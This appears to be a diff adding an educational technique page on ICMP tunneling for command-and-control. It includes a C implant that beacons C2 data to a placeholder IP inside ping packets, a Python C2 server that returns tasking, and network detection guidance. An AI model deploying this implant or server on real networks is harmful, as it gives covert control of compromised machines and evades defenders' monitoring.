@@ -1,0 +1,228 @@
+---
+title: ICMP Tunneling
+mitre: T1095
+category: c2
+group: Covert Channels
+summary: Smuggle C2 data inside ICMP Echo request and reply payloads to bypass application-layer filtering.
+platform: [Windows, Linux]
+tags: ['C / C++', 'Python', 'ICMP', 'Raw Sockets']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: open raw socket (SOCK_RAW, IPPROTO_ICMP)
+    desc: A raw socket gives direct access to the ICMP layer; requires admin/CAP_NET_RAW.
+    dll: ws2_32 / libc
+  - call: craft ICMP Echo Request (type 8)
+    desc: Build the ICMP header with a chosen identifier and sequence number; encode C2 data in the payload field.
+    dll: —
+  - call: sendto / recvfrom
+    desc: Send the crafted packet to the C2 server; receive the Echo Reply (type 0) containing the server's response data.
+    dll: ws2_32
+  - call: decode payload
+    desc: Extract and decrypt the data bytes from the ICMP payload field.
+    dll: —
+detections:
+  - src: NETWORK
+    text: ICMP Echo payloads larger than the standard 32 bytes (Windows default) or containing non-zero, non-pattern data.
+  - src: NETWORK
+    text: High-rate ICMP traffic to a single external IP — ping storms from a single host.
+  - src: BEHAVIOURAL
+    text: ICMP traffic to the internet from a host that has no legitimate reason to ping external IPs.
+  - src: DEEP PACKET
+    text: ICMP payload containing structured, high-entropy, or repeated data patterns inconsistent with diagnostic tools.
+related:
+  - mitre: T1071.004
+    title: DNS Beaconing
+    desc: Alternative covert channel; DNS is harder to block than ICMP in most environments.
+    href: /techniques/c2/dns-beaconing
+  - mitre: T1071.001
+    title: HTTP Beaconing
+    desc: Higher bandwidth and harder to inspect than ICMP inside TLS.
+    href: /techniques/c2/http-beaconing
+labKit:
+  - label: icmp_c2.c + icmp_server.py
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: INetSim ICMP responder
+    href: /toolkit
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+ICMP (ping) is a network-layer protocol that many firewalls pass without inspection because
+it is used for diagnostics. The ICMP Echo payload field is nominally used to carry a test
+pattern, but the protocol imposes no constraint on its content. An implant can send C2 data
+as the payload of Echo Requests and receive tasking in Echo Replies, all while appearing to
+be a ping.
+
+Bandwidth is limited — typical ICMP packets carry 8–1472 bytes of payload (Ethernet MTU
+minus IP and ICMP headers) — but the channel is reliable enough for tasking, output, and file
+transfer in small chunks.
+
+<Callout type="note">
+  Raw socket access requires elevated privileges: Administrator on Windows, CAP_NET_RAW or root
+  on Linux. This limits ICMP tunneling to post-escalation scenarios. Most enterprise firewalls
+  also block outbound ICMP to the internet by default, making DNS or HTTP more practical for
+  initial egress.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Implant (C, Windows)
+
+<CodeBlock
+  file="icmp_client.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <winsock2.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "ws2_32.lib")
+
+#define C2_IP      "203.0.113.1"
+#define ICMP_ECHO  8
+#define ICMP_REPLY 0
+
+typedef struct {
+    BYTE  type, code;
+    WORD  checksum;
+    WORD  id, seq;
+} ICMP_HDR;
+
+static WORD checksum(const WORD *data, int len) {
+    DWORD sum = 0;
+    while (len > 1) { sum += *data++; len -= 2; }
+    if (len) sum += *(BYTE*)data;
+    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
+    return (WORD)~sum;
+}
+
+void icmp_beacon(const BYTE *payload, int pay_len) {
+    WSADATA wsa;
+    WSAStartup(MAKEWORD(2,2), &wsa);
+
+    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+
+    // Build packet: ICMP header + encoded payload
+    BYTE pkt[1024];
+    ICMP_HDR *hdr = (ICMP_HDR*)pkt;
+    hdr->type     = ICMP_ECHO;
+    hdr->code     = 0;
+    hdr->id       = (WORD)GetCurrentProcessId();
+    hdr->seq      = 1;
+    memcpy(pkt + sizeof(ICMP_HDR), payload, pay_len);
+    hdr->checksum = 0;
+    hdr->checksum = checksum((WORD*)pkt, sizeof(ICMP_HDR) + pay_len);
+
+    struct sockaddr_in dst = {0};
+    dst.sin_family = AF_INET;
+    inet_pton(AF_INET, C2_IP, &dst.sin_addr);
+
+    sendto(s, (char*)pkt, sizeof(ICMP_HDR) + pay_len,
+           0, (struct sockaddr*)&dst, sizeof dst);
+
+    // Receive reply containing server data
+    BYTE reply[1024];
+    int  reply_len = recv(s, (char*)reply, sizeof reply, 0);
+    if (reply_len > 28) {   // 20-byte IP header + 8-byte ICMP header
+        BYTE *data = reply + 28;
+        int   data_len = reply_len - 28;
+        // process C2 response in data[0..data_len-1]
+        (void)data_len;
+    }
+    closesocket(s);
+    WSACleanup();
+}`}
+/>
+
+### Server (Python — Linux)
+
+<CodeBlock
+  file="icmp_server.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`import socket, struct, os, time
+
+ICMP_ECHO  = 8
+ICMP_REPLY = 0
+
+def checksum(data: bytes) -> int:
+    s = 0
+    for i in range(0, len(data) - 1, 2):
+        s += (data[i] << 8) + data[i+1]
+    if len(data) % 2:
+        s += data[-1] << 8
+    while s >> 16:
+        s = (s & 0xFFFF) + (s >> 16)
+    return ~s & 0xFFFF
+
+def build_reply(ident: int, seq: int, payload: bytes) -> bytes:
+    hdr   = struct.pack("!BBHHH", ICMP_REPLY, 0, 0, ident, seq)
+    csum  = checksum(hdr + payload)
+    return struct.pack("!BBHHH", ICMP_REPLY, 0, csum, ident, seq) + payload
+
+def server():
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    s.bind(('', 0))
+    print("[*] ICMP C2 server listening")
+    while True:
+        raw, addr = s.recvfrom(65535)
+        ip_hdr_len = (raw[0] & 0x0F) * 4
+        icmp = raw[ip_hdr_len:]
+        typ, code, _, ident, seq = struct.unpack("!BBHHH", icmp[:8])
+        payload = icmp[8:]
+        if typ == ICMP_ECHO and payload:
+            data = payload.decode(errors='replace').strip()
+            print(f"[{addr[0]}] Echo ({ident}/{seq}): {data[:80]}")
+            # send task as reply payload
+            task = b"NOP"
+            s.sendto(build_reply(ident, seq, task), addr)
+
+server()`}
+/>
+
+## Packet structure
+
+<CodeBlock
+  file="packet_structure.txt"
+  label="text"
+  lang="text"
+  class="mb-7.5"
+  code={` 0                   1                   2                   3
+ 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|     Type (8)  |     Code (0)  |           Checksum            |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|         Identifier            |        Sequence Number        |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|          C2 data payload (up to ~1464 bytes per packet)       |
+|              XOR/AES-encrypted, base64 or raw bytes           |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+Windows default ping payload: 32 bytes (abcdefghijklmnopqrstuvwabcdefghi)
+C2 payload: anything > 32 bytes, or non-default pattern, is anomalous`}
+/>
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The most scalable detection is a network baseline: what is the normal ICMP volume and destination
+set for each host? Any host pinging an external IP more than a few times per minute, or sending
+ICMP with non-standard payload sizes, is an outlier worth investigating. DPI that compares
+payload entropy against the expected `abcdefghi...` pattern is a low-overhead complement.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
